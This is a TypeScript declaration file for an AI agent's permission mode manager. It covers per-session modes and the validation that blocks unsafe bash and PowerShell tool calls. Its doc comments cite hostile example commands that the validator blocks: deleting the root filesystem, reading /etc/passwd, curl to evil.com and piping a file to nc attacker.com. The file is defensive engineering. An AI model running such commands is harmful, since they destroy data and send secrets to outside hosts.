/**
 * Centralized Permission Mode Manager
 *
 * Manages agent permission modes for tool execution.
 * Each session has its own mode state - no global state contamination.
 *
 * Available Permission Modes:
 * - 'safe': Plan-first mode (blocks writes, never prompts)
 * - 'ask': Ask for permission on dangerous operations (default interactive behavior)
 * - 'auto-edit': Apply edits automatically, ask for other risky operations
 * - 'allow-all': Skip all permission checks (everything allowed)
 */
import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
import { looksLikePowerShell, isPowerShellAvailable, type PowerShellValidationResult, type PowerShellValidationReason } from './powershell-validator.ts';
import { type PermissionMode, type ModeConfig, type CompiledApiEndpointRule, type CompiledBashPattern, type CompiledBlockedCommandHint, type MismatchAnalysis, PERMISSION_MODE_ORDER, PERMISSION_MODE_CONFIG, SAFE_MODE_CONFIG, type PermissionModeCanonical, toCanonicalPermissionMode, parsePermissionMode } from './mode-types.ts';
export { type PermissionMode, type PermissionModeCanonical, type ModeConfig, type CompiledApiEndpointRule, type CompiledBashPattern, type CompiledBlockedCommandHint, type MismatchAnalysis, PERMISSION_MODE_ORDER, PERMISSION_MODE_CONFIG, SAFE_MODE_CONFIG, toCanonicalPermissionMode, parsePermissionMode, };
export { type PowerShellValidationResult, type PowerShellValidationReason, looksLikePowerShell, isPowerShellAvailable, };
/**
 * State for a single session's permission mode
 */
export type PermissionModeChangedBy = 'user' | 'system' | 'restore' | 'automation' | 'unknown';
type PermissionModeChangeMetadata = {
    changedBy?: PermissionModeChangedBy;
    changedAt?: string;
    suppressLog?: boolean;
};
export interface ModeState {
    /** Session ID */
    sessionId: string;
    /** Current permission mode */
    permissionMode: PermissionMode;
    /** Previous permission mode (if any mode transition has occurred) */
    previousPermissionMode?: PermissionMode;
    /** Monotonic version incremented each time the mode changes */
    modeVersion: number;
    /** ISO timestamp for the last mode change */
    lastChangedAt: string;
    /** Actor that initiated the last mode change */
    lastChangedBy: PermissionModeChangedBy;
    /** Last user-mode modeVersion for which one-turn signal has been consumed */
    lastUserSignalConsumedModeVersion?: number;
    /** Callback when mode state changes */
    onStateChange?: (state: ModeState) => void;
}
/**
 * Callbacks for mode changes
 */
export interface ModeCallbacks {
    onStateChange?: (state: ModeState) => void;
}
/**
 * Manager for per-session permission mode state.
 * Each session has its own state - NO GLOBAL STATE.
 */
declare class ModeManager {
    private states;
    private callbacks;
    private subscribers;
    /**
     * Hydrate persisted transition context (previous mode) without mutating current mode/version.
     * Used on session restore so transition metadata can survive app restarts.
     */
    setPreviousPermissionMode(sessionId: string, previousPermissionMode?: PermissionMode): void;
    /**
     * Get or create state for a session
     */
    getState(sessionId: string): ModeState;
    /**
     * Set permission mode for a session.
     * @returns true when state changed, false when mode was unchanged
     */
    setPermissionMode(sessionId: string, mode: PermissionMode, metadata?: PermissionModeChangeMetadata): boolean;
    /**
     * Mark the current user-origin mode change signal as consumed.
     * No-op unless the latest mode change was user-initiated.
     */
    consumeUserModeSignal(sessionId: string): void;
    /**
     * Register callbacks for a session
     */
    registerCallbacks(sessionId: string, callbacks: ModeCallbacks): void;
    /**
     * Unregister callbacks for a session
     */
    unregisterCallbacks(sessionId: string): void;
    /**
     * Clean up a session's state
     */
    cleanupSession(sessionId: string): void;
    /**
     * Subscribe to mode changes for a session (for React useSyncExternalStore)
     * Returns an unsubscribe function
     */
    subscribe(sessionId: string, callback: () => void): () => void;
}
export declare const modeManager: ModeManager;
/**
 * Get the current permission mode for a session
 */
export declare function getPermissionMode(sessionId: string): PermissionMode;
/**
 * Set the permission mode for a session.
 * @returns true when state changed, false when mode was unchanged
 */
export declare function setPermissionMode(sessionId: string, mode: PermissionMode, metadata?: PermissionModeChangeMetadata): boolean;
/**
 * Consume one-turn user mode-change signal for the current modeVersion.
 */
export declare function consumeUserModeSignal(sessionId: string): void;
/**
 * Cycle to the next permission mode (for SHIFT+TAB)
 * @param sessionId - The session to cycle mode for
 * @param enabledModes - Optional list of enabled modes to cycle through (defaults to all modes)
 * Returns the new mode
 */
export declare function cyclePermissionMode(sessionId: string, enabledModes?: PermissionMode[]): PermissionMode;
/**
 * Subscribe to mode changes for a session (for React useSyncExternalStore)
 * Returns an unsubscribe function
 */
export declare function subscribeModeChanges(sessionId: string, callback: () => void): () => void;
/**
 * Get mode state for a session
 */
export declare function getModeState(sessionId: string): ModeState;
/**
 * Hydrate persisted transition context for a session without changing current mode.
 */
export declare function hydratePreviousPermissionMode(sessionId: string, previousPermissionMode?: PermissionMode): void;
/**
 * Lightweight diagnostics for permission denials and debugging.
 */
export declare function getPermissionModeDiagnostics(sessionId: string): {
    permissionMode: PermissionMode;
    previousPermissionMode?: PermissionMode;
    transitionDisplay?: string;
    modeVersion: number;
    lastChangedAt: string;
    lastChangedBy: PermissionModeChangedBy;
    userModeSignalPending: boolean;
};
/**
 * Initialize permission mode state for a session with callbacks
 */
export declare function initializeModeState(sessionId: string, initialMode: PermissionMode | {
    permissionMode?: PermissionMode;
}, callbacks?: ModeCallbacks): void;
/**
 * Clean up mode state for a session
 */
export declare function cleanupModeState(sessionId: string): void;
/**
 * Config type that works with both ModeConfig and MergedPermissionsConfig
 */
type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;
/**
 * Check if a command contains dangerous control characters.
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous control chars, false if safe
 */
export declare function hasDangerousControlChars(command: string): boolean;
/**
 * Check if a command contains dangerous command/process substitution patterns.
 *
 * Detects:
 * - Command substitution: $(...) or `...` (backticks)
 * - Process substitution: <(...) or >(...)
 *
 * These are dangerous because they execute arbitrary commands:
 * - `ls $(rm -rf /)` - the rm runs during argument expansion
 * - `echo "$(cat /etc/passwd)"` - executes even inside double quotes
 * - `cat <(curl http://evil.com)` - process substitution runs curl
 *
 * Note: Single-quoted strings are safe: `echo '$(rm)'` is literal text
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous substitution, false if safe
 */
export declare function hasDangerousSubstitution(command: string): boolean;
/**
 * Pattern info for error messages - shows what patterns might have matched
 */
export interface RelevantPatternInfo {
    source: string;
    comment?: string;
}
/**
 * Detailed reason why a bash command was rejected in Plan mode.
 * Used to provide helpful error messages that explain exactly what was blocked and why.
 */
export type BashRejectionReason = {
    type: 'control_char';
    char: string;
    charCode: number;
    explanation: string;
} | {
    type: 'no_safe_pattern';
    command: string;
    relevantPatterns: RelevantPatternInfo[];
    mismatchAnalysis?: MismatchAnalysis;
    commandHint?: CompiledBlockedCommandHint;
} | {
    type: 'dangerous_operator';
    operator: string;
    operatorType: 'chain' | 'redirect';
    explanation: string;
} | {
    type: 'dangerous_substitution';
    pattern: string;
    explanation: string;
} | {
    type: 'parse_error';
    error: string;
} | {
    type: 'pipeline';
    explanation: string;
} | {
    type: 'redirect';
    op: string;
    explanation: string;
} | {
    type: 'command_expansion';
    explanation: string;
} | {
    type: 'process_substitution';
    explanation: string;
} | {
    type: 'parameter_expansion';
    explanation: string;
} | {
    type: 'env_assignment';
    explanation: string;
} | {
    type: 'unsafe_command';
    command: string;
    explanation: string;
} | {
    type: 'compound_partial_fail';
    failedCommands: string[];
    passedCommands: string[];
};
/**
 * Normalize Windows backslash paths in a command string so that bash-parser
 * (a POSIX parser) can handle them without treating \ as escape characters.
 *
 * Converts backslashes to forward slashes inside:
 * - Double-quoted strings: "C:\Users\..." → "C:/Users/..."
 * - Single-quoted strings: passed through (bash-parser treats them as literal anyway)
 * - Unquoted tokens that look like Windows paths: C:\Users\... → C:/Users/...
 *
 * Preserves actual bash escape sequences (\n, \t, \\, \", etc.) inside
 * double-quoted strings by only converting backslashes that precede
 * characters that are NOT standard bash escape targets.
 */
export declare function normalizeWindowsPathsForBashParser(command: string): string;
/**
 * Get detailed reason why a bash command would be rejected.
 * Returns null if the command is safe, otherwise returns the specific reason.
 *
 * Uses AST-based validation for compound commands (&&, ||, ;) to allow
 * safe compound commands like `git status && git log` while still blocking
 * dangerous constructs.
 *
 * For PowerShell commands (detected by syntax or on Windows), uses the
 * PowerShell validator with native System.Management.Automation parsing.
 *
 * This is used to provide helpful error messages that explain exactly what
 * was blocked and why, helping the agent understand and avoid the issue.
 */
export declare function getBashRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null;
/**
 * Format a bash rejection reason into a user-friendly error message.
 * The message explains what was blocked and why, helping the agent understand the issue.
 * Includes actionable guidance on how to customize permissions.
 */
export declare function formatBashRejectionMessage(reason: BashRejectionReason, config: ToolCheckConfig): string;
/**
 * Check if a Bash command is read-only using the given config.
 *
 * Uses AST-based validation to properly handle compound commands like
 * `git status && git log` - each part is validated separately, and the
 * command is allowed only if ALL parts pass.
 *
 * A command is considered safe if:
 * 1. It does NOT contain dangerous control characters (newlines, etc.)
 * 2. All simple commands match read-only patterns (including in compound commands)
 * 3. It does NOT contain redirects (>, >>, <) - these modify files
 * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
 * 5. It does NOT run in background (&)
 *
 * Compound commands (&&, ||, |) are allowed when ALL parts are safe:
 * - `git status && git log` is allowed (both commands are safe)
 * - `git log | head` is allowed (both commands are safe)
 *
 * This multi-step check prevents attacks like:
 * - `ls\nrm -rf /` (newline injection)
 * - `git status && rm -rf /` (dangerous command in chain - rm not in allowlist)
 * - `cat file | nc attacker.com` (nc not in allowlist)
 * - `ls $(rm -rf /)` (command substitution)
 */
/**
 * Check if a Bash command is read-only using a custom config.
 * Exported for testing purposes.
 *
 * @param command - The bash command to check
 * @param config - Tool check configuration with patterns
 * @returns true if command is safe to run in read-only mode
 */
export declare function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean;
/**
 * Check if a Bash command is read-only using the default safe mode config.
 * Exported for testing.
 *
 * @param command - The bash command to check
 * @returns true if command is safe to run in read-only mode
 */
export declare function isReadOnlyBashCommand(command: string): boolean;
/**
 * Extract the write target path from a bash command.
 * Returns the file path if the command writes to a file via redirect, null otherwise.
 *
 * Handles:
 * - Direct redirects: `echo "x" > /path/file`
 * - Codex subshell pattern: `/bin/zsh -lc "cat <<'EOF' > /path/file\n...\nEOF"`
 * - sh/bash -c variants: `bash -c "echo x > /path/file"`
 * - PowerShell Out-File: `@(...) | Out-File -FilePath 'path'`
 * - PowerShell Set-Content/Add-Content: `'...' | Set-Content -Path 'path'`
 */
export declare function extractBashWriteTarget(command: string): string | null;
/**
 * Check if a command looks like it might be trying to write files.
 * Used to provide better error messages when write detection fails.
 */
export declare function looksLikePotentialWrite(command: string): boolean;
/**
 * Get a helpful hint based on comparing target path to plans folder path.
 * Detects common mistakes and provides actionable guidance.
 */
export declare function getPathHint(targetPath: string, plansFolderPath: string, dataFolderPath?: string): string | null;
/**
 * Check if an API endpoint is allowed based on permissions context.
 * Used in 'ask' mode to auto-allow whitelisted API endpoints from permissions.json.
 *
 * @param method - HTTP method (GET, POST, etc.)
 * @param path - API endpoint path
 * @param permissionsContext - Context for loading custom permissions
 * @returns true if endpoint is allowed (GET or matches allowedApiEndpoints rules)
 */
export declare function isApiEndpointAllowed(method: string, path: string | undefined, permissionsContext?: PermissionsContext): boolean;
/**
 * Result type for tool permission checks
 */
export type ToolCheckResult = {
    allowed: true;
    requiresPermission?: false;
} | {
    allowed: true;
    requiresPermission: true;
    description: string;
} | {
    allowed: false;
    reason: string;
};
/**
 * Centralized check: should a tool be allowed based on permission mode?
 *
 * This is the single source of truth for tool permissions.
 * Returns different results based on the permission mode:
 * - 'safe': Block writes entirely (no prompting)
 * - 'ask': Allow but may require permission for dangerous operations
 * - 'auto-edit': Allow but may require permission for non-edit dangerous operations
 * - 'allow-all': Allow everything
 */
export declare function shouldAllowToolInMode(toolName: string, toolInput: unknown, mode: PermissionMode, options?: {
    plansFolderPath?: string;
    dataFolderPath?: string;
    permissionsContext?: PermissionsContext;
}): ToolCheckResult;
/**
 * Create a hook return value that blocks a tool.
 * Returns the correct SDK format for PreToolUse hook blocking.
 *
 * The reason is prefixed with "[ERROR]" so the Codex model can distinguish
 * blocked tool calls from successful ones. See the detailed comment on
 * errorResponse() in packages/session-tools-core/src/response.ts for the
 * full explanation of the tool error signaling behavior.
 *
 * @param reason - The reason for blocking (from shouldAllowToolInMode)
 */
export declare function blockWithReason(reason: string): {
    continue: boolean;
    decision: "block";
    reason: string;
};
/**
 * Get the current session state for prompt injection
 */
export declare function getSessionState(sessionId: string): {
    permissionMode: PermissionMode;
};
/**
 * Format session state as a lightweight XML block for injection into user messages.
 * Always includes the plans folder path so agent knows where plans are stored.
 */
export declare function formatSessionState(sessionId: string, options?: {
    plansFolderPath?: string;
    dataFolderPath?: string;
    consumeModeChangeUserSignal?: boolean;
}): string;
